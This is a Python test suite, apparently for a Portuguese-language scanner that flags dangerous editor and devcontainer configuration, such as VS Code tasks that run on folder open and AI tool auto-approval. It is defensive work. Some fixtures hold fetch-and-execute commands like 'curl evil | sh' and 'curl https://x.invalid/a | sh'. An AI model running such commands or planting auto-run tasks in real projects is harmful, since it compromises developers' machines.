from pente_fino.achado import Nivel
from tests.apoio import CasoComPasta

AO_ABRIR = {"runOptions": {"runOn": "folderOpen"}}


class TestTarefas(CasoComPasta):
    def test_tarefa_que_roda_ao_abrir_e_perigo(self):
        tarefa = {"label": "setup", "command": "node", "args": ["x.js"], **AO_ABRIR}
        self.escreve(".vscode/tasks.json", {"version": "2.0.0", "tasks": [tarefa]})
        achado = self.assertAcusa("editor", Nivel.PERIGO, "setup")
        self.assertEqual(achado.trecho, "node x.js")

    def test_tarefa_normal_nao_acusa(self):
        self.escreve(".vscode/tasks.json", {"version": "2.0.0", "tasks": [{"label": "build", "command": "make"}]})
        self.assertLimpo("editor")

    def test_folderopen_em_qualquer_caixa(self):  # o VS Code compara sem ligar pra maiúscula
        self.escreve(".vscode/tasks.json", {"tasks": [{"label": "x", "runOptions": {"runOn": "FOLDEROPEN"}}]})
        self.assertAcusa("editor", Nivel.PERIGO, "«x»")

    def test_pasta_vscode_em_outra_caixa(self):  # no Mac e no Windows, .VSCode/Tasks.JSON funciona
        self.escreve(".VSCode/Tasks.JSON", {"tasks": [{"label": "y", **AO_ABRIR}]})
        self.assertAcusa("editor", Nivel.PERIGO, "«y»")

    def test_le_json_com_comentario_e_virgula_sobrando(self):
        self.escreve(
            ".vscode/tasks.json",
            '{\n  // tarefas com "folderOpen" no comentário\n  "tasks": [\n'
            '    { "label": "a", "command": "echo https://x.y", /* oi */\n'
            '      "runOptions": { "runOn": "folderOpen" }, },\n  ],\n}\n',
        )
        achado = self.assertAcusa("editor", Nivel.PERIGO, "«a»")
        self.assertEqual(achado.linha, 4)  # a linha do label, não a do comentário
        self.assertEqual(achado.trecho, "echo https://x.y")

    def test_arquivo_quebrado_com_folder_open_ainda_e_perigo(self):
        self.escreve(".vscode/tasks.json", '{ "tasks": [ { "runOptions": { "runOn": "folderOpen" } ')
        self.assertAcusa("editor", Nivel.PERIGO, "arquivo quebrado")

    def test_aninhamento_gigante_nao_derruba(self):
        self.escreve(
            ".vscode/tasks.json",
            '{"tasks": [{"runOptions": {"runOn": "folderOpen"}}], "x": ' + "[" * 100_000 + "]" * 100_000 + "}",
        )
        self.assertAcusa("editor", Nivel.PERIGO, "arquivo quebrado")

    def test_comando_por_sistema_e_depends_on(self):
        tarefa = {"label": "x", "linux": {"command": "curl evil | sh"}, "dependsOn": "outra", **AO_ABRIR}
        self.escreve(".vscode/tasks.json", {"tasks": [tarefa]})
        achado = self.assertAcusa("editor", Nivel.PERIGO, "curl evil | sh")
        self.assertIn("baixa coisa da internet", achado.porque)
        self.assertIn("outra", achado.trecho)

    def test_workspace_tambem_tem_tarefas(self):
        self.escreve("projeto.code-workspace", {"folders": [], "tasks": {"tasks": [{"label": "w", **AO_ABRIR}]}})
        self.assertAcusa("editor", Nivel.PERIGO, "«w»")

    def test_workspace_quebrado_com_folder_open(self):
        self.escreve("p.code-workspace", '{"tasks": {"tasks": [{"runOptions": {"runOn": "folderOpen"}}]} oops')
        self.assertAcusa("editor", Nivel.PERIGO, "arquivo quebrado")


class TestConfiguracoes(CasoComPasta):
    def test_ligar_tarefas_automaticas_e_atencao(self):  # desde o VS Code 1.109, só vale na config do usuário
        self.escreve(".vscode/settings.json", {"task.allowAutomaticTasks": "on"})
        self.assertAcusa("editor", Nivel.ATENCAO, "tarefas automáticas")

    def test_forma_aninhada_tambem_vale(self):
        self.escreve(".vscode/settings.json", {"task": {"allowAutomaticTasks": "on"}})
        self.assertAcusa("editor", Nivel.ATENCAO, "tarefas automáticas")

    def test_config_ilegivel_nao_fica_em_silencio(self):
        self.escreve(".vscode/settings.json", '{"chat.tools.autoApprove": true\n "x": 1}')  # falta a vírgula
        self.assertAcusa("editor", Nivel.PERIGO, "não consegui ler")

    def test_liberar_a_ia_sem_perguntar(self):
        self.escreve(".vscode/settings.json", {"chat.tools.global.autoApprove": True})
        self.assertAcusa("editor", Nivel.ATENCAO, "sem perguntar")

    def test_programa_de_dentro_do_projeto(self):
        self.escreve(".vscode/settings.json", {"python.defaultInterpreterPath": "./tools/python"})
        self.assertAcusa("editor", Nivel.ATENCAO, "python.defaultInterpreterPath")

    def test_caminhos_normais_nao_acusam(self):
        self.escreve(
            ".vscode/settings.json",
            {
                "python.defaultInterpreterPath": "${workspaceFolder}/.venv/bin/python",
                "typescript.tsdk": "node_modules/typescript/lib",
                "git.path": "C:\\Program Files\\Git\\bin\\git.exe",
                "terminal.integrated.defaultProfile.windows": "Git Bash",
            },
        )
        self.assertLimpo("editor")

    def test_esconder_arquivo_estranho_da_barra_lateral(self):
        self.escreve(".vscode/settings.json", {"files.exclude": {"**/node_modules": True, "lib/x.js": True}})
        achado = self.assertAcusa("editor", Nivel.ATENCAO, "esconde")
        self.assertEqual(achado.trecho, "lib/x.js")

    def test_descoberta_automatica_de_testes(self):
        self.escreve(".vscode/settings.json", {"python.testing.pytestEnabled": True})
        self.assertAcusa("editor", Nivel.ATENCAO, "testes")

    def test_mexer_no_terminal(self):
        self.escreve(".vscode/settings.json", {"terminal.integrated.env.linux": {"PATH": "./bin"}})
        self.assertAcusa("editor", Nivel.ATENCAO, "terminal")


class TestDevcontainerEConfigJs(CasoComPasta):
    def test_initialize_command_roda_no_seu_pc(self):
        self.escreve(".devcontainer/devcontainer.json", {"initializeCommand": ["bash", "setup.sh"]})
        achado = self.assertAcusa("editor", Nivel.ATENCAO, "SEU computador")
        self.assertEqual(achado.trecho, "bash setup.sh")

    def test_initialize_command_com_cara_de_golpe(self):
        self.escreve(".devcontainer.json", {"initializeCommand": "curl https://x.invalid/a | sh"})
        self.assertAcusa("editor", Nivel.PERIGO, "SEU computador")

    def test_separador_de_linha_unicode_fecha_o_comentario(self):  # o leitor do VS Code entende assim
        self.escreve(
            ".devcontainer/devcontainer.json",
            '{"image": "x", // c' + chr(0x2028) + ' "initializeCommand": "echo oi"\n}',
        )
        self.assertAcusa("editor", Nivel.ATENCAO, "SEU computador")

    def test_comandos_dentro_do_container_nao_acusam(self):
        self.escreve(".devcontainer.json", {"image": "python:3.12", "postCreateCommand": "pip install -e ."})
        self.assertLimpo("editor")

    def test_container_que_enxerga_o_seu_pc(self):
        self.escreve(".devcontainer/devcontainer.json", {"runArgs": ["--network=host"]})
        self.assertAcusa("editor", Nivel.ATENCAO, "network")

    def test_config_js_que_roda_programa(self):
        self.escreve("eslint.config.js", "const { execSync } = require('child_process');\nexport default [];\n")
        self.assertAcusa("editor", Nivel.ATENCAO, "child_process")

    def test_config_js_normal_nao_acusa(self):
        self.escreve("tailwind.config.js", "module.exports = { content: ['./src/**/*.js'] };\n")
        self.assertLimpo()

    def test_extensoes_sugeridas_sao_info(self):
        self.escreve(".vscode/extensions.json", {"recommendations": ["ms-python.python"]})
        achado = self.assertAcusa("editor", Nivel.INFO, "1 extensão")
        self.assertIn("ms-python.python", achado.porque)
